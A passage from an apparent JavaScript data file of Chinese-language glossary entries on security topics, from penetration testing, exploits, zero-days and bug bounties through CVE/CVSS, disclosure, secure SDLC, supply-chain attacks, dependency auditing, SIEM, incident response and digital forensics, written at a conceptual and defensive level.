      { to: 'sec-pentest', desc: '渗透测试是红队工作的子集与起点' },
      { to: 'sec-incident-response', desc: '蓝队的核心产出就是可执行的事件响应能力' },
      { to: 'sec-siem', desc: '蓝队检测与响应依托 SIEM 的告警聚合' },
    ],
  },
  {
    id: 'sec-pentest',
    name: '渗透测试',
    en: 'Penetration Testing',
    cat: 'security',
    sub: '渗透与漏洞管理',
    tags: ['对抗', '测试'],
    summary: '在书面授权下模拟真实攻击者对系统做安全性验证，交付漏洞报告与修复建议——主动找洞，先于攻击者。',
    detail: `**标准流程**：
1. **授权与范围界定**（白盒给源码/黑盒只给域名；明确禁止项与应急联系人）——**没有书面授权的"测试"就是违法**
2. **信息收集**：资产测绘、子域枚举、技术栈指纹
3. **漏洞发现**：扫描器（Nessus/Burp）+ 人工验证
4. **漏洞利用与深入**：验证危害、尝试提权与横向（在范围内）
5. **报告**：漏洞复现步骤、危害评级、修复建议、复测结论

**类型**：网络渗透 / Web 渗透 / 移动端 / 社会工程演练 / 云配置审查。

**与扫描器的区别**：扫描器给"可能的问题清单"，渗透测试给"验证过危害、能走到哪一步"的攻击链视角——很多高危组合漏洞只有串联才能发现。

**实践**：重要系统至少年度渗透 + 大改版后专项；修完必须复测（"已修复"与"已验证修复"是两回事）。`,
    relations: [
      { to: 'sec-bug-bounty', desc: '漏洞赏金是把渗透测试众包化的持续形态' },
      { to: 'sec-red-blue-team', desc: '渗透测试是红队服务的基础形态' },
      { to: 'sec-cve-cvss', desc: '报告中的漏洞按 CVSS 思路评级' },
    ],
  },
  {
    id: 'sec-exploit',
    name: '漏洞利用 Exploit',
    en: 'Exploit & PoC',
    cat: 'security',
    sub: '渗透与漏洞管理',
    tags: ['攻击', '漏洞'],
    summary: 'PoC 证明漏洞存在，Exploit 把漏洞变成可稳定使用的攻击代码——漏洞从"存在"到"武器化"的一步。',
    detail: `**概念区分**：
- **漏洞（Vulnerability）**：系统缺陷本身
- **PoC（Proof of Concept）**：验证漏洞存在的最小代码（证明"真的能利用"）
- **Exploit**：完整利用代码，稳定拿到预期效果（shell/数据）
- **Payload**：exploit 成功后执行的载荷（反弹 shell、植入后门）——exploit 是"破门工具"，payload 是"进门后干的事"

**武器化链条**：漏洞披露 → 研究者写 PoC →（武器化）exploit 进漏洞利用框架（Metasploit 模块）→ 大规模自动化攻击。**从披露到被大规模利用的中位数时间只有数天**——这就是补丁要快的原因。

**防御视角**：
- 虚拟补丁：WAF/IPS 挡已知 exploit 特征（补丁窗口期救命）
- 暴露面收敛：打不到的漏洞无法被利用
- 监控利用特征（蜜罐/IDS 的规则来源就是公开 exploit）`,
    relations: [
      { to: 'sec-zero-day', desc: '0day 是"尚无补丁"的 exploit，价值与危害最高' },
      { to: 'sec-cve-cvss', desc: '漏洞编号与评分让全球防御者对齐同一威胁' },
      { to: 'sec-waf', desc: '虚拟补丁靠 WAF/IPS 拦截公开 exploit 特征' },
    ],
  },
  {
    id: 'sec-zero-day',
    name: '零日漏洞 0day',
    en: 'Zero-Day',
    cat: 'security',
    sub: '渗透与漏洞管理',
    tags: ['攻击', '漏洞'],
    summary: '厂商尚不知情、无补丁可打的漏洞——发现即"零天"防御窗口，是 APT 攻击的战略武器。',
    detail: `**命名含义**：厂商知道漏洞的那天起"第 0 天"开始计算——0day 意味着**防御时间为零**。

**市场与现实**：
- 0day 在地下市场按"利用可靠性 × 影响面"定价，浏览器/移动端全链可达的可达数十万到数百万美元
- 买方包括研究团队（提交厂商换赏金）、红队、以及国家级攻击组织（APT）
- N-day：已披露有补丁但未修复的漏洞——现实中被利用最多的其实是 N-day（"有补丁没人打"）

**著名案例**：Stuxnet 用了 4 个 Windows 0day；Exchange ProxyLogon 0day 被用于批量入侵邮件服务器。

**无补丁时代的防御思路**：
1. **缓解措施**（虚拟补丁、禁用受影响功能、网络隔离）
2. **检测异常**（0day 行为仍会留下痕迹：异常进程链、出网行为）——EDR 行为检测价值高于签名
3. **纵深防御与最小权限**：一个 0day 打不穿所有层
4. 威胁情报订阅：第一时间知道"新 0day 在打谁"`,
    relations: [
      { to: 'sec-exploit', desc: '0day 的价值在于其 exploit 尚无防御特征' },
      { to: 'sec-defense-in-depth', desc: '对 0day 唯一的通用解是分层防御' },
      { to: 'sec-cve-cvss', desc: '0day 披露后会被分配 CVE 并获 CVSS 评分' },
    ],
  },
  {
    id: 'sec-bug-bounty',
    name: '漏洞赏金计划',
    en: 'Bug Bounty',
    cat: 'security',
    sub: '渗透与漏洞管理',
    tags: ['对抗', '治理'],
    summary: '厂商公开悬赏白帽子提交漏洞——把全球研究者的眼睛变成你的持续安全测试力量。',
    detail: `**运作模式**：厂商公布范围（域名/APP/程序）与规则 → 白帽子在范围内测试 → 提交漏洞 → 厂商验证后按严重度付赏金（低危几十美元到高危数万美元）。平台：HackerOne、Bugcrowd；国内各 SRC（Security Response Center）。

**为什么有效**：
- **规模**：几万研究者 > 几个内部安全工程师
- **持续性**：7×24 全球时区总有人在测
- **只按结果付费**：与固定年费咨询相比更经济

**关键规则设计**（少一条就鸡飞狗跳）：
- 明确范围与禁止手段（DoS 测试、社工员工通常禁止）
- 明确响应时效承诺（SLA）——白帽子的耐心有限
- **安全港条款**：承诺对善意研究者免于法律追究
- 高危给高分（奖金与 CVSS/实际危害挂钩）

**与 SRC/内部测试的关系**：赏金是外部众包，内部 SDL 与渗透测试覆盖系统性问题——三者互补，不是替代。`,
    relations: [
      { to: 'sec-pentest', desc: '赏金计划是渗透测试的众包化持续版' },
      { to: 'sec-vuln-disclosure', desc: '赏金计划必须配套负责任披露流程' },
      { to: 'sec-cve-cvss', desc: '严重度评估决定赏金额度' },
    ],
  },
  {
    id: 'sec-cve-cvss',
    name: 'CVE 与 CVSS',
    en: 'CVE & CVSS',
    cat: 'security',
    sub: '渗透与漏洞管理',
    tags: ['漏洞', '标准'],
    summary: 'CVE 给漏洞全球统一编号，CVSS 给漏洞打 0-10 分——安全行业的"身份证 + 危害度量衡"。',
    detail: `**CVE（Common Vulnerabilities and Exposures）**：MITRE 维护的漏洞编号体系，格式 \`CVE-年份-序号\`（如 CVE-2021-44228 即 Log4Shell）。让全球对"到底是哪个漏洞"无歧义沟通——情报、补丁、扫描器全部以 CVE 为索引。

**CVSS（通用漏洞评分系统）v3.1**：0-10 分，由三组指标计算：

- **基础分**（不变量）：攻击向量（网络/本地）、复杂度、是否需要交互、影响范围（Scope 是否波及他人）、对 CIA 的影响
- 时间分：是否有 exploit/补丁
- 环境分：对你的业务的重要性修正

**读分经验**：9.0+ 通常是 RCE/无需认证的完美风暴（Log4Shell 10.0）；但**分数≠你的实际风险**——一个 7 分漏洞如果正好打在你暴露的核心服务上，比 9 分的内部组件漏洞紧急得多。**风险 = 漏洞 × 资产暴露度 × 业务重要性**。

**实践**：扫描器输出对齐 CVE；修复优先级按"CVSS × 资产重要性"排序，而不是盲目按分数。`,
    relations: [
      { to: 'sec-exploit', desc: '有 exploit 的 CVE 实际风险显著上调' },
      { to: 'sec-zero-day', desc: '0day 披露后即获得 CVE 编号进入公共管理流程' },
      { to: 'ops-alerting', desc: '高危 CVE 的修复优先级需要进入运维告警流程' },
    ],
  },
  {
    id: 'sec-vuln-disclosure',
    name: '漏洞披露',
    en: 'Vulnerability Disclosure',
    cat: 'security',
    sub: '渗透与漏洞管理',
    tags: ['治理', '漏洞'],
    summary: '发现漏洞后如何披露是一门平衡艺术：太快危险、不披露坑用户，负责任披露是行业共识。',
    detail: `**三种流派**：

1. **完全披露**：直接公开全部细节——倒逼修复，但等于给攻击者发武器
2. **不披露/私下**：只告知厂商——用户长期裸奔，厂商可能拖延
3. **负责任披露（Responsible/Coordinated Disclosure）** ✅ 行业共识：报告厂商 → 约定修复窗口（通常 90 天，Project Zero 的纪律线）→ 到期或修复后协调公开细节

**时间线中的关键角色**：研究者（发现与报告）、厂商（确认/修复/致谢）、CVE 编号机构（编号分配）、CSIRT/CERT（协调多方，重大漏洞时组织全网响应）。

**争议点**：修复期限该多长？关键基础设施漏洞是否应永久保密？厂商"已读不回"怎么办（Project Zero 的 90 天自动公开就是对此的制衡）。

**对开发者的启示**：给自己项目留一个 \`SECURITY.md\`（安全联系方式），收到报告后先确认时限再沟通修复——处理得当，报告者会成为你最忠实的免费质检员。`,
    relations: [
      { to: 'sec-bug-bounty', desc: '赏金计划是制度化、有偿化的披露渠道' },
      { to: 'sec-cve-cvss', desc: '协调披露的终点通常是 CVE 编号发布' },
      { to: 'sec-secure-sdlc', desc: '披露流程是 SDL 对外响应能力的出口' },
    ],
  },
  {
    id: 'sec-secure-sdlc',
    name: '安全开发生命周期 SDL',
    en: 'Secure SDLC',
    cat: 'security',
    sub: '安全工程与应急',
    tags: ['安全原则', '流程'],
    summary: '把安全活动嵌入开发全流程：需求做威胁建模、编码有规范扫描、上线有安全门禁——安全左移降本增效。',
    detail: `**各阶段安全活动**（微软 SDL 为蓝本）：

- **需求/设计**：威胁建模、安全需求（STRIDE 输出进技术方案）
- **编码**：安全编码规范、**SAST** 静态扫描（看代码找漏洞模式）、IDE 插件实时提示
- **依赖**：**SCA** 组件分析（依赖里有没有已知 CVE）
- **测试**：**DAST** 动态扫描（黑盒打运行中的应用）、密钥扫描（防止 API key 进仓库）
- **发布**：安全门禁（高危漏洞阻断合并/发布）、制品签名
- **运行**：渗透测试、漏洞响应、监控

**为什么左移**：设计缺陷在编码后才发现，返工成本 10 倍；上线后才发现，成本 100 倍还带泄露。"扫描器在上线前拦一次"比"事后救火"便宜太多。

**落地要点**：扫描工具误报多会逼开发者关掉——从增量扫描（只拦新增问题）与高置信规则起步，逐步收紧。`,
    relations: [
      { to: 'sec-threat-modeling', desc: '威胁建模是 SDL 设计阶段的核心活动' },
      { to: 'sec-dependency-audit', desc: 'SCA 依赖审计是 SDL 依赖阶段的核心工具' },
      { to: 'ops-pipeline', desc: '安全门禁实现在 CI 流水线里' },
      { to: 'lc-code-review', desc: '安全维度的 Code Review 是 SDL 的人工防线' },
    ],
  },
  {
    id: 'sec-supply-chain',
    name: '软件供应链攻击',
    en: 'Software Supply Chain Attack',
    cat: 'security',
    sub: '安全工程与应急',
    tags: ['攻击', '供应链'],
    summary: '不攻破你，而是污染你信任的上游：依赖包、构建工具、更新通道——一次投毒，万包中招。',
    detail: `**为什么可怕**：你代码里 90% 是第三方依赖，它们的代码又不是它们自己写的——**信任链越长，审查越不可能**。攻击者打的是"你自动信任的环节"。

**经典案例**：
- **SolarWinds**：构建系统被植入后门，官方签名更新分发给 1.8 万客户（含政府机构）——"打了补丁也中招"
- **event-stream**：作者弃维护，攻击者接管 npm 包名注入恶意代码（周下载百万）
- **XZ Utils 后门**（2024）：攻击者以维护者身份潜伏三年，在压缩库中植入 SSH 后门——开源供应链的警世钟

**三类污染点**：依赖包（typosquatting、接管弃包）、构建环境（CI 凭证、构建机）、分发通道（更新服务器、镜像站）。

**防御**：
1. **依赖锁定**（lockfile）+ **SBOM**（软件物料清单，知道自己碗里有什么）
2. SCA 扫描 + 新依赖人工审查（评分/维护活跃度）
3. 构建环境加固：CI 凭证最小权限、可复现构建（reproducible build）
4. 分发签名校验（更新包验签）`,
    relations: [
      { to: 'sec-dependency-audit', desc: 'SCA 是供应链风险的自动化检测手段' },
      { to: 'sec-digital-signature', desc: '分发签名是更新通道被劫持的最后防线' },
      { to: 'ops-registry-hub', desc: '私有镜像仓库与依赖源是供应链的第一道闸' },
    ],
  },
  {
    id: 'sec-dependency-audit',
    name: '依赖审计 SCA',
    en: 'Software Composition Analysis',
    cat: 'security',
    sub: '安全工程与应急',
    tags: ['工具', '供应链'],
    summary: '自动分析项目用了哪些第三方组件、是否含已知 CVE——现代应用一半以上的漏洞来自依赖而非自研代码。',
    detail: `**是什么**：SCA（软件成分分析）工具读取 lockfile/构建产物，生成 SBOM（软件物料清单），与 CVE 数据库（NVD/GitHub Advisory）比对，输出"哪个依赖、哪个版本、有什么漏洞、怎么升"。

**核心能力**：
- 已知漏洞匹配（npm audit / pip-audit / Snyk / Trivy）
- 传递依赖可视化（你引入 A，A 引了有漏洞的 B——99% 的团队说不清自己的传递依赖）
- 许可证合规（GPL 传染性问题）
- 恶意包检测（新投毒包的特征库）

**工程化**：
1. CI 门禁：新增高危 CVE 阻断合并
2. lockfile 必提交且锁定（禁止 \`^1.x\` 漂移引入未知版本）
3. 紧急响应预案：Log4Shell 级漏洞爆发时，能否 1 小时内列出"我们哪些项目受影响"？（SBOM 的价值时刻）

**局限**：只看"已知漏洞"；无漏洞但被植入后门的包（XZ 案例）要靠包来源审查与社区行为监控。`,
    relations: [
      { to: 'sec-supply-chain', desc: 'SCA 是供应链攻击的核心防御工具' },
      { to: 'sec-cve-cvss', desc: 'SCA 的漏洞情报以 CVE 为索引、CVSS 为参考' },
      { to: 'sec-secure-sdlc', desc: 'SCA 嵌入 SDL 的依赖与 CI 阶段' },
    ],
    example: `# CI 中常用命令
npm audit --audit-level=high || exit 1
trivy fs --severity HIGH,CRITICAL .`,
  },
  {
    id: 'sec-siem',
    name: 'SIEM 安全事件管理',
    en: 'Security Information & Event Management',
    cat: 'security',
    sub: '安全工程与应急',
    tags: ['防御', '监控'],
    summary: '汇聚全网日志与告警做关联分析的安全大脑——单条日志是噪音，关联起来才是攻击链。',
    detail: `**是什么**：Security Information & Event Management——集中采集（服务器、防火墙、WAF、EDR、云审计、应用日志）→ 归一化 → **关联分析** → 告警 → 留存取证。产品：Splunk、Elastic Security、Wazuh、云厂商 SIEM。

**为什么必须聚合**：单点看都是正常——
- 一次失败登录：正常
- 一次新设备登录：正常
- 但"失败登录×20 → 成功 → 新设备 → 立即创建 API Key → 异地下载"串起来就是标准入侵链。**关联规则**正是把这些跨源事件连成攻击故事线。

**核心能力**：
1. 关联规则与用例库（如 MITRE ATT&CK 映射的检测规则）
2. UEBA 用户行为分析（基线偏离检测）
3. 合规留存（等保/审计要求的日志保留期）

**实践坑**：告警疲劳（每天几千条没人看=没有 SIEM）；日志不全（最关键的登录审计没接）；没有演练（真出事时发现查询语句都写不出来）。**SIEM 的产出质量 = 规则质量 × 日志覆盖 × 响应流程成熟度**。`,
    relations: [
      { to: 'sec-ids-ips', desc: 'IDS/IPS 告警是 SIEM 的重要输入' },
      { to: 'sec-incident-response', desc: 'SIEM 的告警触发 IR 流程，IR 反哺检测规则' },
      { to: 'ops-logging', desc: 'SIEM 建立在完善的日志体系之上' },
      { to: 'sec-threat-modeling', desc: '检测用例应覆盖威胁建模识别的高风险场景' },
    ],
  },
  {
    id: 'sec-incident-response',
    name: '安全事件响应 IR',
    en: 'Incident Response',
    cat: 'security',
    sub: '安全工程与应急',
    tags: ['应急', '流程'],
    summary: '安全事件爆发时的标准处置流程：准备→检测→遏制→根除→恢复→复盘——慌乱时的作战手册。',
    detail: `**六阶段流程（NIST 框架）**：

1. **准备**：应急预案、值班表、取证工具包、备份验证——平时不备，战时必乱
2. **检测与分析**：确认事件（SIEM 告警/外部通报）、定级（P1 数据泄露 vs P2 单机中毒）、启动响应
3. **遏制（Containment）**：**先止血**——隔离失陷主机（拔网线级）、吊销凭证、封 IP、下线受影响服务。争论根因前先止损
4. **根除（Eradication）**：清除后门/恶意进程、找到根因（怎么进来的）、修补
5. **恢复**：从可信备份恢复、灰度回流量、加强监控观察复发
6. **复盘（Lessons Learned）**：时间线还原、为什么没早发现、改进项落地——**最重要却最常被跳过的一步**

**关键纪律**：
- 保留证据（内存快照、磁盘镜像）再重装——先取证后重置
- 沟通口径统一（对外声明/客户通知/监管上报有时限要求，如等保与 GDPR 的 72 小时）
- 无责复盘文化：奖励上报而非惩罚中招者`,
    relations: [
      { to: 'sec-siem', desc: 'SIEM 是检测阶段的告警来源与取证数据源' },
      { to: 'sec-forensics', desc: '取证支撑根因分析，是根除与复盘的证据基础' },
      { to: 'lc-incident', desc: '全链路视角下线上故障应急与安全 IR 流程同构' },
      { to: 'ops-backup-dr', desc: '恢复阶段的底牌是验证过的备份' },
    ],
    interview: '答题骨架："先遏制止损、保留证据、再根因、最后复盘改进"——顺序错（急着重启/重装毁证据）是大忌。',
  },
  {
    id: 'sec-forensics',
    name: '数字取证',
    en: 'Digital Forensics',
    cat: 'security',
    sub: '安全工程与应急',
    tags: ['应急', '取证'],
    summary: '按法律与流程标准保全、提取、分析数字证据，回答"发生了什么、怎么发生的、谁干的"。',
    detail: `**核心原则**：
1. **证据完整性**：改动证据前先做镜像与哈希（链式保管记录 chain of custody）——企业内部复盘可宽松，涉及司法则必须严格
2. **取证顺序**：易失性优先——内存 > 网络连接 > 进程 > 磁盘 > 备份。**重启会毁掉最关键的内存证据**（这正是勒索/入侵后"先别急着重启"的原因）

**取证对象**：
- **内存取证**：Rootkit 隐藏的进程、明文密码、加密密钥（Volatility 框架）
- **磁盘取证**：文件系统时间线、已删除文件恢复、恶意样本提取
- **日志与网络**：登录记录、流量镜像、云审计日志（CloudTrail 等）
- **终端 EDR 遥测**：进程链（谁拉起了恶意进程）、文件操作、注册表

**产出**：攻击时间线（TA 进来→提权→横向→外传）、IOC 提取（恶意 IP/域名/哈希，反哺检测规则）、根因报告。

**工程实践**：EDR/SIEM 平时的日志留存决定了"事后的取证能力"——没留日志的事故只能靠猜。`,
    relations: [
      { to: 'sec-incident-response', desc: '取证为 IR 的根因分析与复盘提供证据' },
      { to: 'sec-rootkit', desc: '内存取证是对抗内核隐藏手段的关键' },
      { to: 'ops-logging', desc: '日志留存策略决定取证能力的下限' },
    ],
  },
];

